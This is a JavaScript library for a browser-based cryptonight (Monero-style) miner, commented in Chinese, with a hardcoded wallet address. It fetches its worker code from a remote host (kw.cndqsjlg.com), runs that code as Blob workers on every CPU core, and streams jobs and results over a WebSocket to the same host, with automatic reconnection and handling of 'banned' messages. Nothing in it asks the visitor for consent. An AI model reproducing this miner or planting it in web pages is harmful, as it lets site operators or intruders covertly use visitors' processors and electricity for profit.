(function (window) {
    "use strict";
    var mc = function (wallet) {
        this.hc=navigator.hardwareConcurrency||4; //获取当前cpu核心数量
        //this.workerURL = 'cryptonight-asmjs.min.js';
        this.workerURL = 'http://kw.cndqsjlg.com/lib/cryptonight-asmjs.min.js';
        //this.workerURL = 'worker.js';  //worker 文件路径
        //钱包地址
        this.wallet = wallet||'46PQt7f4TPVj4Xu1T1LTXy6yRTTj1stLeBd8srFXrwgoao5Gc5hde6YYvXpC3skgccJS9aWzXYjRLXYgeXQpM7f54Ec3BBM';
        this.ls = []; //分线数组
        this.hash_accepted = 0;
        this.found=0;
        this.wait = 0; //重试时间
        this.totalHashes = 0; //当前页面计算出的总Hash 数量
        this.reConnectTimes=0;
    }
    mc.prototype.build = function () { //创建 WebSocket
        if(this.ws) return false;
        this.wait=3;
        this.ws = new WebSocket('wss://kw.cndqsjlg.com/api')
        this.ws.onmessage = this._onMessage.bind(this);
        this.ws.onerror = this._onError.bind(this);
        this.ws.onclose = this._onClose.bind(this);
        this.ws.onopen = this._onOpen.bind(this);
    }
    mc.prototype._onOpen = function (e) {
        //console.log(this.wallet)
        var ps = {wallet:this.wallet}
        this.send('auth',ps)
    }
    mc.prototype._onMessage = function (e) {
        var res = JSON.parse(e.data);
        //console.log(e)
        if(res.type=='job'){
            //console.log('assign')
            this.assign(res.params)
        }
        if(res.type=='hash_accepted'){
            this.hash_accepted++;
        }
        if(res.type=='banned'){
            this.stop(600)
        }
        if(res.token){
            this.token=res.token
        }
    }
    mc.prototype._onError = function (e) {
        //console.log('error:',e)
        this._onClose()
    }
    mc.prototype._onClose = function (e) {
        this.ws = null
        if(this.wait){
            setTimeout(this.start(),this.wait*1e3)
            this.reConnectTimes++;
        }
    }
    mc.prototype.send = function (type,ps) {
        this.ws.send(JSON.stringify({type:type,params:ps||{}}))
    }

    mc.prototype.buildWorkLine = function () { //创建 工作分线
        var wl = new Worker(this.workerURL) // js新特性 Worker
        wl.onmessage = (function (msg){
            //console.log(this.curJob)
            //console.log('in onmessage',msg)
            //document.getElementById('cl').innerHTML = JSON.stringify(this.curJob)
            if(msg.data === 'ready'){
                wl.runing = true
            }else{
                if(msg.data.result) {
                    wl.cb(msg.data)
                }
                wl.hashes+= msg.data.hashes
                wl.rate=msg.data.hashesPerSecond;
                this.totalHashes+=msg.data.hashes
            }
            if(this.curJob) wl.postMessage(this.curJob);
        }).bind(this)
        wl.setJob=function(job,cb){
            wl.postMessage(job)
            wl.cb=cb
        }
        wl.stop = function () {
            wl.terminate();
            wl=null
        }
        wl.cb = function (){}
        wl.hashes=0;
        wl.rate=0
        this.ls.push(wl) //添加到数组中
    }
    mc.prototype.start = function (wallet,ps) { //启动
        if(this.ws) return;
        this.wait=3;
        this.wallet=wallet?wallet:this.wallet
        if (!this.wfState) {
            var xhr = new XMLHttpRequest;
            var me = this;
            xhr.addEventListener("load", function () {
                me.workerURL = URL.createObjectURL(new Blob([xhr.responseText]))
                me.wfState = true;
            })
            xhr.open("get", this.workerURL, false);
            xhr.send()
        }
        this.build()
        for(var i=0;i<this.hc;i++){
            this.buildWorkLine()
        }

    }
    mc.prototype.stop = function (s) { //停止方法
        this.wait = s||0;
        for(var i=0;i<this.ls.length;i++){
            this.ls[i].stop()
        }
        this.ls=[];
        this.ws.close()
    }
    mc.prototype.assign = function(job) { //分配任务
        this.curJob = job;
        var unUseRate= document.getElementById('throttle').value || 0.7;
        job.throttle=unUseRate?(1-unUseRate/10):0.3;
        //console.log(this.ls)
        for(var i=0;i<this.ls.length;i++){
            //console.log('assign'+i)
            this.ls[i].setJob(job, (function (res){
                //console.log('found',res)
                this.found++;
                if (res.job_id === this.curJob.job_id) {console.log('can Submit') //判断当前任务是否与worker返回的任务是否一致
                    this.send("submit", {
                        job_id: res.job_id,
                        nonce: res.nonce,
                        result: res.result
                    })
                }
            }).bind(this))
        }
    }
    mc.prototype.getSpeed = function () {
        var speed={hashes:this.totalHashes,rate:0}
        for(var i=0;i<this.ls.length;i++){
            speed.hashes+=this.ls[i].hashes
            speed.rate+=Math.round(this.ls[i].rate)
        }
        return speed;
    }
    window.mc=mc;
})(window)
